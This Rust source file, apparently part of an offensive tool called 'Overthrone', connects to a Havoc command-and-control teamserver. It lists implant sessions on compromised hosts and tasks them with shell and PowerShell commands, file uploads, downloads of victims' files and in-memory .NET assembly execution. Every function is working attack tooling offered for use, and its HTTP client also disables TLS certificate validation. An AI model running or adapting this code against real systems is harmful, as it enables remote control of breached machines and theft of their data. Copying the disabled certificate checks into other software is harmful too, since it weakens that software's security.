//! Havoc C2 integration via REST API
//!
//! Connects to the Havoc teamserver's REST management API.
//! Reference: https://github.com/HavocFramework/Havoc

use std::collections::HashMap;
use std::time::Duration;
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use crate::error::{OverthroneError, Result};
use super::{
    C2Channel, C2Config, C2Framework, C2Auth, C2Session, C2TaskResult,
    C2Listener, SessionType, ImplantRequest,
};

pub struct HavocChannel {
    connected: bool,
    base_url: String,
    token: String,
    server_info: HashMap<String, String>,
}

impl HavocChannel {
    pub fn new() -> Self {
        Self {
            connected: false,
            base_url: String::new(),
            token: String::new(),
            server_info: HashMap::new(),
        }
    }

    async fn api_get(&self, endpoint: &str) -> Result<String> {
        let url = format!("{}{}", self.base_url, endpoint);

        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(30))
            .build()
            .map_err(|e| OverthroneError::C2(format!("HTTP client error: {}", e)))?;

        let resp = client.get(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .send()
            .await
            .map_err(|e| OverthroneError::C2(format!("API GET {} error: {}", url, e)))?;

        resp.text().await
            .map_err(|e| OverthroneError::C2(format!("Response read error: {}", e)))
    }

    async fn api_post(&self, endpoint: &str, body: &str) -> Result<String> {
        let url = format!("{}{}", self.base_url, endpoint);

        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(30))
            .build()
            .map_err(|e| OverthroneError::C2(format!("HTTP client error: {}", e)))?;

        let resp = client.post(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Content-Type", "application/json")
            .body(body.to_string())
            .send()
            .await
            .map_err(|e| OverthroneError::C2(format!("API POST {} error: {}", url, e)))?;

        resp.text().await
            .map_err(|e| OverthroneError::C2(format!("Response read error: {}", e)))
    }
}

#[async_trait]
impl C2Channel for HavocChannel {
    fn framework(&self) -> C2Framework { C2Framework::Havoc }

    async fn connect(&mut self, config: &C2Config) -> Result<()> {
        let scheme = if config.tls { "https" } else { "http" };
        self.base_url = format!("{}://{}:{}/api", scheme, config.host, config.port);

        self.token = match &config.auth {
            C2Auth::Token { token } => token.clone(),
            C2Auth::Password { password } => {
                // Authenticate and get token
                let auth_body = serde_json::json!({
                    "username": "overthrone",
                    "password": password,
                }).to_string();

                let resp = self.api_post("/auth/login", &auth_body).await?;
                let parsed: serde_json::Value = serde_json::from_str(&resp)
                    .map_err(|e| OverthroneError::C2(format!("Auth response parse error: {}", e)))?;

                parsed["token"].as_str()
                    .ok_or_else(|| OverthroneError::C2("No token in auth response".to_string()))?
                    .to_string()
            }
            _ => return Err(OverthroneError::C2(
                "Havoc requires Token or Password authentication".to_string()
            )),
        };

        self.connected = true;
        log::info!("[c2:havoc] Connected to Havoc at {}", self.base_url);
        Ok(())
    }

    async fn disconnect(&mut self) -> Result<()> {
        self.connected = false;
        self.token.clear();
        log::info!("[c2:havoc] Disconnected");
        Ok(())
    }

    fn is_connected(&self) -> bool { self.connected }

    async fn list_sessions(&self) -> Result<Vec<C2Session>> {
        let resp = self.api_get("/demons").await?;
        let demons: serde_json::Value = serde_json::from_str(&resp)
            .map_err(|e| OverthroneError::C2(format!("Parse error: {}", e)))?;

        let mut sessions = Vec::new();
        if let Some(arr) = demons.as_array() {
            for d in arr {
                sessions.push(C2Session {
                    id: d["AgentID"].as_str().unwrap_or("").to_string(),
                    hostname: d["Computer"].as_str().unwrap_or("").to_string(),
                    ip: d["ExternalIP"].as_str().unwrap_or("").to_string(),
                    username: d["User"].as_str().unwrap_or("").to_string(),
                    domain: d["Domain"].as_str().unwrap_or("").to_string(),
                    process: d["Process"].as_str().unwrap_or("").to_string(),
                    pid: d["PID"].as_u64().unwrap_or(0) as u32,
                    arch: d["Arch"].as_str().unwrap_or("").to_string(),
                    os: d["OS"].as_str().unwrap_or("").to_string(),
                    elevated: d["Elevated"].as_bool().unwrap_or(false),
                    session_type: SessionType::Demon,
                    last_seen: d["LastSeen"].as_str().unwrap_or("").to_string(),
                    sleep_interval: d["Sleep"].as_u64().map(Duration::from_secs),
                    metadata: HashMap::new(),
                });
            }
        }

        Ok(sessions)
    }

    async fn get_session(&self, session_id: &str) -> Result<C2Session> {
        self.list_sessions().await?
            .into_iter()
            .find(|s| s.id == session_id)
            .ok_or_else(|| OverthroneError::C2(format!(
                "Demon {} not found", session_id
            )))
    }

    async fn exec_command(&self, session_id: &str, command: &str) -> Result<C2TaskResult> {
        let body = serde_json::json!({
            "AgentID": session_id,
            "Command": "shell",
            "Args": command,
        }).to_string();

        let resp = self.api_post("/demons/command", &body).await?;

        Ok(C2TaskResult {
            task_id: format!("havoc-{}", uuid::Uuid::new_v4().as_simple()),
            success: true,
            output: resp,
            error: String::new(),
            raw_data: None,
            duration: Duration::from_millis(0),
        })
    }

    async fn exec_powershell(&self, session_id: &str, script: &str) -> Result<C2TaskResult> {
        let body = serde_json::json!({
            "AgentID": session_id,
            "Command": "powershell",
            "Args": script,
        }).to_string();

        let resp = self.api_post("/demons/command", &body).await?;

        Ok(C2TaskResult {
            task_id: format!("havoc-ps-{}", uuid::Uuid::new_v4().as_simple()),
            success: true,
            output: resp,
            error: String::new(),
            raw_data: None,
            duration: Duration::from_millis(0),
        })
    }

    async fn upload_file(&self, session_id: &str, local_data: &[u8], remote_path: &str) -> Result<C2TaskResult> {
        let body = serde_json::json!({
            "AgentID": session_id,
            "Command": "upload",
            "Path": remote_path,
            "Data": base64::Engine::encode(&base64::engine::general_purpose::STANDARD, local_data),
        }).to_string();

        let resp = self.api_post("/demons/command", &body).await?;
        Ok(C2TaskResult {
            task_id: format!("havoc-up-{}", uuid::Uuid::new_v4().as_simple()),
            success: true, output: resp, error: String::new(),
            raw_data: None, duration: Duration::from_millis(0),
        })
    }

    async fn download_file(&self, session_id: &str, remote_path: &str) -> Result<C2TaskResult> {
        let body = serde_json::json!({
            "AgentID": session_id,
            "Command": "download",
            "Path": remote_path,
        }).to_string();

        let resp = self.api_post("/demons/command", &body).await?;
        Ok(C2TaskResult {
            task_id: format!("havoc-dl-{}", uuid::Uuid::new_v4().as_simple()),
            success: true, output: resp, error: String::new(),
            raw_data: None, duration: Duration::from_millis(0),
        })
    }

    async fn execute_assembly(&self, session_id: &str, assembly_data: &[u8], args: &str) -> Result<C2TaskResult> {
        let body = serde_json::json!({
            "AgentID": session_id,
            "Command": "dotnet",
            "Assembly": base64::Engine::encode(&base64::engine::general_purpose::STANDARD, assembly_data),
            "Args": args,
        }).to_string();

        let resp = self.api_post("/demons/command", &body).await?;
        Ok(C2TaskResult {
            task_id: format!("havoc-asm-{}", uuid::Uuid::new_v4().as_simple()),
            success: true, output: resp, error: String::new(),
            raw_data: None, duration: Duration::from_millis(0),
        })
    }

    async fn list_listeners(&self) -> Result<Vec<C2Listener>> {
        let resp = self.api_get("/listeners").await?;
        let parsed: serde_json::Value = serde_json::from_str(&resp).unwrap_or_default();

        let mut listeners = Vec::new();
        if let Some(arr) = parsed.as_array() {
            for l in arr {
                listeners.push(C2Listener {
                    name: l["Name"].as_str().unwrap_or("").to_string(),
                    listener_type: l["Protocol"].as_str().unwrap_or("").to_string(),
                    host: l["Host"].as_str().unwrap_or("").to_string(),
                    port: l["Port"].as_u64().unwrap_or(0) as u16,
                    active: l["Status"].as_str().unwrap_or("") == "active",
                });
            }
        }

        Ok(listeners)
    }

    async fn server_info(&self) -> Result<HashMap<String, String>> {
        Ok(self.server_info.clone())
    }
}
